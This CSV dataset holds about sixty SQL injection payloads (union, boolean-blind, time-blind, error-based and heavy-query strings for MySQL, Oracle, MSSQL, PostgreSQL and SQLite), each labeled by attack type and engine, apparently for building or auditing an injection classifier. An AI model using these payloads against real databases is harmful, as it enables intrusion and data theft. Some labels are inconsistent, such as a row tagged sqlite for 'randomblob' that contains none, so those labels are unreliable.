payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
select ( case when ( 3344 = 8103 ) then 3344 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,2010,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 3344 = 8103 ) then 3344 else 1/ ( select 0 ) end ) --
"1 ) union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2011,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) union all select null,null,null,null#"
-4384' ) ) ) or 6872 = 6872 and ( ( ( 'ukhl' = 'ukhl,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2012,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4384' ) ) ) or 6872 = 6872 and ( ( ( 'ukhl' = 'ukhl
"1'+ ( select qmez where 3729 = 3729 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2013,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1'+ ( select qmez where 3729 = 3729 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1"" ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2014,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) union all select null,null,null,null,null,null,null--"
"1 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2015,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null,null,null,null,null--"
"1 ) ) as dhge where 4816 = 4816 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,2016,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) as dhge where 4816 = 4816 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""ynde"" = ""ynde",error_based,oracle,0.85,utl_inaddr for error extraction,KEEP,,error_based,oracle,2017,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""ynde"" = ""ynde"
1'|| ( select 'blvu' from dual where 9813 = 9813,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2018,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'blvu' from dual where 9813 = 9813
"1, ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,2019,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1, ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )"
"1' and elt ( 4249 = 4249,7259 ) and 'pgvz' = 'pgvz",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2020,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' and elt ( 4249 = 4249,7259 ) and 'pgvz' = 'pgvz"
-1304' ) union all select 7639#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2021,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-1304' ) union all select 7639#
"-8612"" ) or 4043 = 3083 and ( ""pjzo"" like ""pjzo",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2022,boolean_blind,generic,Pattern match: 'or 4043 = 3083' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-8612"" ) or 4043 = 3083 and ( ""pjzo"" like ""pjzo"
"-5780 or make_set ( 3464 = 4518,4518 ) -- icit",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2023,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-5780 or make_set ( 3464 = 4518,4518 ) -- icit"
-9148 ) where 2027 = 2027 or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2024,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9148 ) where 2027 = 2027 or 8571 = 8571--
1 ) ) as somz where 1598 = 1598,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2025,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as somz where 1598 = 1598
-3849 ) or 5580 = 3442--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2026,boolean_blind,generic,Pattern match: 'or 5580 = 3442' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3849 ) or 5580 = 3442--
"1"" and make_set ( 8403 = 8403,8899 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2027,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" and make_set ( 8403 = 8403,8899 )"
"-5225' ) ) as zats where 5629 = 5629 union all select 5629,5629,5629,5629,5629--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2028,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5225' ) ) as zats where 5629 = 5629 union all select 5629,5629,5629,5629,5629--"
"-8893%' ) union all select 1254,1254--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2029,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8893%' ) union all select 1254,1254--"
"-5596' ) ) ) union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2030,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5596' ) ) ) union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--"
"-7238%' or make_set ( 5375 = 9563,9563 ) and '%' = '",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2031,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-7238%' or make_set ( 5375 = 9563,9563 ) and '%' = '"
"-6883"" ) as tbai where 8121 = 8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2032,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6883"" ) as tbai where 8121 = 8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--"
"1 where 6408 = 6408 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2033,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 where 6408 = 6408 union all select null,null,null,null,null,null,null,null--"
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2034,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #"
"1"" ) where 4964 = 4964",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2035,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 4964 = 4964"
1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) -- yczq,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,2036,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) -- yczq
"1 ) union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2037,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) union all select null,null,null,null,null#"
1' ) ) as jzoh where 6484 = 6484 and 7364 = 4233--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2038,boolean_blind,generic,Pattern match: 'and 7364 = 4233' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) as jzoh where 6484 = 6484 and 7364 = 4233--
"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2039,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --"
1 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- knpw,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,2040,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- knpw
1 where 3802 = 3802 and 2006 = 2006,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2041,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 where 3802 = 3802 and 2006 = 2006
"-4355"" ) ) ) or 9323 = 9323#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2042,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4355"" ) ) ) or 9323 = 9323#"
"1"" ) ) as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,2043,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
1 ) ) as trin where 8843 = 8843,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2044,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as trin where 8843 = 8843
1'|| ( select 'xdzp' from dual where 5786 = 5786 and ( 3020 = 3020 ) *6703 ) ||',boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,2045,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'xdzp' from dual where 5786 = 5786 and ( 3020 = 3020 ) *6703 ) ||'
-3881 ) ) ) union all select 4438--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2046,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-3881 ) ) ) union all select 4438--
select sleep ( 5 ) and ( ( ( '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2047,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( ( '%' = '
1'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,2048,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--
"1"" ) and elt ( 6651 = 1172,1172 ) and ( ""zfkb"" like ""zfkb",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2049,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) and elt ( 6651 = 1172,1172 ) and ( ""zfkb"" like ""zfkb"
"1"" ) and 6565 = 2647 and ( ""mrge"" like ""mrge",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2050,boolean_blind,generic,Pattern match: 'and 6565 = 2647' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) and 6565 = 2647 and ( ""mrge"" like ""mrge"
"1'+ ( select dgnt where 4701 = 4701 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,2051,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'+ ( select dgnt where 4701 = 4701 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"1 ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 7589 = 7589",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,2052,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 7589 = 7589"
1 ) as hhly where 2906 = 2906,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2053,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as hhly where 2906 = 2906
1 ) as vqbf where 4020 = 4020,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2054,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as vqbf where 4020 = 4020
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2055,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#"
"1 ) union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2056,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) union all select null,null--"
1' ) ) as gfzb where 7904 = 7904,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2057,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as gfzb where 7904 = 7904
"-9779' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'hmzj' = 'hmzj",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2058,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9779' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'hmzj' = 'hmzj"
"1%' ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,2059,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
-7430' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,2060,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-7430' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --
-1648 ) ) as oqqy where 3459 = 3459 or 6872 = 6872--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2061,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1648 ) ) as oqqy where 3459 = 3459 or 6872 = 6872--
"-7731"" ) ) or make_set ( 2551 = 4389,4389 ) and ( ( ""unly"" like ""unly",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2062,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-7731"" ) ) or make_set ( 2551 = 4389,4389 ) and ( ( ""unly"" like ""unly"
"-5372"" ) as wlqm where 2432 = 2432 union all select 2432,2432,2432,2432,2432,2432#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2063,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5372"" ) as wlqm where 2432 = 2432 union all select 2432,2432,2432,2432,2432,2432#"
"-9996' or make_set ( 1237 = 7111,7111 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2064,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9996' or make_set ( 1237 = 7111,7111 )"
select ( case when ( 4690 = 4373 ) then 4690 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,2065,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4690 = 4373 ) then 4690 else 1/ ( select 0 ) end ) --
"-6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,2066,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"1 ) ) as xsyk where 2575 = 2575 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2067,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) ) as xsyk where 2575 = 2575 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1 ) where 7815 = 7815 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2068,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 7815 = 7815 union all select null,null,null,null,null,null,null#"
select sleep ( 5 ) and 'eskp' like 'eskp,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2069,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and 'eskp' like 'eskp
